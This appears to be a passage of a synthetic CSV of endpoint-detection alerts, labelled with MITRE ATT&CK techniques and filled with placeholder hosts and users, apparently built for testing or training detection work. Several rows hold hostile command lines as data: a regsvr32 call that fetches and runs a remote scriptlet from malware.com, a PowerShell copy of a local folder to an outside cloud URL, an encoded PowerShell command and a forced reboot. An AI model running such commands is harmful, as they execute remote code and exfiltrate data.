Detection']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dkfkgl,,2023-03-10T15:00:00Z,,,,Hijack Execution Flow,"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time.",,,,,,Hijack Execution Flow,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,svchost.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized process injection,,,,,,,,,,,,,,,,,,,,,,,malware.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0294fty,,2023-03-10T16:00:00Z,,,,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior.",,,,,,Impair Defenses,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,laptop01,user01,,,Blocked,Unauthorized security control disablement,,,,,,,,,,,,,,,,,,,,,,,,,Windows Defender Antivirus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-34567,,2022-10-31T15:20:30Z,High,,,Implant Internal Image,Implant internal image detected on PC-1234,,,,,,,,,,,,,,,,,,,internal_image.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,8bc6ab5d6ec7f21202fc9c9358c62d53e1e7ed1a,C:\Program Files (x86)\MyApp\internal_image.dll,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
asdfkwkl45,,2023-03-10T17:00:00Z,,,,Indicator Removal,Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses.,,,,,,Indicator Removal,,,,,,,,,,,,,,,,,High,,File Deletion,,,,,,,,,,,,,,,Defense Evasion,,,C:\ProgramData\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized file deletion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30405607356,,2023-03-10T18:00:00Z,,,,Indirect Command Execution,Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.,,,,,,Indirect Command Execution,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Execution,,,,regsvr32.exe,regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
222221,,2022-03-03T13:42:17Z,,,,Unusual Parent Process,A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.,,,,,,,,,,,,,,,,,,,,,,,High,Command and Scripting Interpreter,,,,Command and Scripting Interpreter (T1059.003),,,,,,,,EDR,,,,,,DESKTOP-ABC123,,cmd.exe,cmd.exe /c echo 'Hello World',,,,JohnDoe,,,,,,,,,,,,,,,MyCustomProcess.exe,,,,,,,,,,,,['Command and Scripting Interpreter'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,"{'ParentProcessName': 'MyCustomProcess.exe', 'ParentProcessPath': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'ParentProcessCommandLine': 'MyCustomProcess.exe /run'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
75668383,,2023-03-10T18:00:00Z,,,,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.",,,,,,Modify Authentication Process,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Userinit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
039403802,,2023-03-10T19:00:00Z,,,,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.",,,,,,Modify Cloud Compute Infrastructure,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of cloud compute instance attribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AWS,ModifyInstanceAttribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02040506,,2023-03-10T20:00:00Z,,,,Modify System Image,Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.,,,,,,Modify System Image,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\System32\ntoskrnl.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,system,,,Blocked,Unauthorized modification of system file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2023-03-10T14:30:00Z,,,,Network Boundary Bridging,Defender for Endpoint EDR has detected network boundary bridging activity in the environment.,,,,,,,,,,,,"C:\Windows\explorer.exe /root,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}",Behavioral Analysis,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,TCP,,,,80,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\explorer.exe,,,EXAMPLE_USER,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Boundary Bridging (T1599),192.168.1.100,10.0.0.2,example.com,Network Boundary Bridging,TCP traffic from an internal IP address to an external IP address,ABCD1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2022-03-09T10:42:11.000Z,,,,Denial of Service,Defender for Endpoint has detected a network denial of service (DoS) attack on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,company.local,,,,COMPANY-PC01,10.0.0.2,192.168.1.101,UDP Flood,120 seconds,"HTTP, DNS, FTP",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
eorof05,,2023-03-10T11:15:00Z,,,,Plist Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses.",,,,,,Plist File Modification,,,/Library/LaunchDaemons/com.apple.plist,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the nature and purpose of the plist modification and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,,2022-10-31T00:00:00Z,,,,Private Key Interception,Private key interception detected on host PC-1234,,,,,,,,,,,,,,,,,,,private_key.pem,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Documents,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,High,File quarantined,Behavior monitoring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1350df0e,,2023-03-10T13:30:00Z,,,,Process Injection,Process injection is a method of executing arbitrary code in the address space of a separate live process.,,,,,,Process Injection,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,notepad.exe,Thread Execution Hijacking,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567,,2023-03-09T15:45:00Z,,,,Proxy Connection,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,,,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
defender_endpoint_alert_12345,,2022-01-01T12:34:56.789Z,High,,,RAdmin Tool,Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,machine-12345,user-67890,1234.0,C:\Program Files (x86)\RAdmin Viewer\rview.exe,RAdmin Tool Used,RAdmin Tool Used to Remotely Control Workstations,192.168.1.100,4899,192.168.1.101,1234,TCP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304r95p,,2022-03-04T10:25:00Z,,,,Possible Removable Media Replication,"Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.",,,,,,,,,C:\Users\User\Documents\SensitiveData.docx,,,,Endpoint Monitoring,,,,,,,,,,High,,,RemovableMediaDetection,,Endpoint Detection and Response,,,,,,,,,,,,Initial Access,,,,explorer.exe,explorer.exe C:\Users\User\Documents\SensitiveData.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,C:\Windows\explorer.exe,,,User,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-12345,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456,16 GB,2022-03-04T10:25:00Z,Copied Files,2 MB,Replication Through Removable Media,192.168.1.2,1909,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0e0r0tq,,2022-03-07T14:23:54.123Z,,,,Resource Hijacking,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,Malware,memory,write,attempt to overwrite critical memory region,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030495,,2023-03-10T16:15:00Z,,,,Rogue Controller,Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC).,,,,,,Rogue Domain Controller,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and investigate the nature and purpose of the rogue domain controller. Remove the unauthorized domain controller and remediate any affected systems.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,dc1.malicious.local,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0pd0d03wr,,2023-03-03T10:15:30Z,,,,Serverless Execution,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,High,Serverless Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,Execution,,,,powershell.exe,-EncodedCommand,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,9D73B2CF2A1C728FE8B282FDC7EE5DE5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Process Creation,,,,,,,powershell.exe -encodedCommand,4688,2E20D26F9C1ACB5547D5BDA70FEBD054,Blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
klfdlf0567,,2022-03-06T10:30:00Z,,,,Service Stop,Defender for Endpoint detected a suspicious stop of a Windows service.,,,,,,,,,,,,,EDR,"['Investigate the reason for the suspicious stop of the service.', ""Review the service's configuration to ensure it is properly configured."", 'Monitor for any further suspicious activity.']",,,,,,,,,High,,,,,Process/Service Stop,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ServiceName,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,SuspiciousServiceName,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,Comprmised Supply Chain,Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,Malware,,,,,,,,,,,,,,,,msiexec.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Investigate the affected software or hardware component for signs of compromise and take appropriate remediation actions, such as blocking the component or applying a security update.",,,,,,,,,443,,,Process,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,123.45.67.89,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Outbound connection to suspicious or known malicious IP and/or port,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ekfkgk6,,2023-03-04T15:30:00Z,,,,System Services,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.","{'EndpointID': '123456', 'Hostname': 'endpoint-01', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10', 'UserName': 'admin', 'ProcessName': 'services.exe', 'ProcessID': '1234'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,System Shutdown,A system shutdown or reboot has been initiated.,,,,,,,,,,,,,,,,,,,,,,,High,,,ProcessCreate,,Malicious Activity,,,,,,,,,,,,,,DESKTOP-1234,,cmd.exe,shutdown /r /t 0,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
739409f,,2023-03-09T12:30:00Z,,,,Unusual traffic,Defender for Endpoint has detected unusual network traffic.,,,,,,,,,,,,,Network traffic analysis,,,,,,,,,,High,,,,,Network,,,,,,,,Defender for Endpoint,,,,,,,,,,,,192.168.0.100,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EXAMPLE-HOSTNAME,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,2023-03-08T14:30:00Z,,,,Data Transfer to Cloud Account,"This alert is triggered when a data transfer to a cloud account is detected, which may indicate data exfiltration or suspicious activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,powershell.exe,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,5678.0,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-abcd-1234-abcd-1234567890ab,,2022-10-15T16:27:42Z,,,,Trojanized SSH client,"SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the users public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",,,,,,,,,,,,,,,,,,,ssh.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,LAPTOP-123,,,,ssh.exe -l user -p 22 example.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files (x86)\SSH\ssh.exe,ssh.exe,,,,,,,,,,,,,,,,,,,,,,,High,,Endpoint detection and response,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,203.0.113.1,Behavioral analysis,abcdef1234567890,Trojan:Win32/SSHClientBreach,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
82940f,,2022-04-01T10:30:00Z,,,,User Execution,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Downloads\malware.exe,,C:\Users\User1\Downloads\malware.exe,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,C:\Windows\explorer.exe,abc123def456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,User Execution,Execution,Unknown,explorer.exe,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
09876,,2023-03-10T15:30:00Z,,,,Valid Accounts,"A user account with administrative privileges was used to perform actions typically associated with malicious activity, including accessing sensitive data or installing software.",,,,,,,,,,,,,,,,,,,,,,,High,,,Behavioral,,,,,,,,,,Microsoft Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Host,User Account,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Privilege Escalation,Valid Accounts,host-1234,10.0.0.1,User account 'Administrator' was used to access sensitive data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
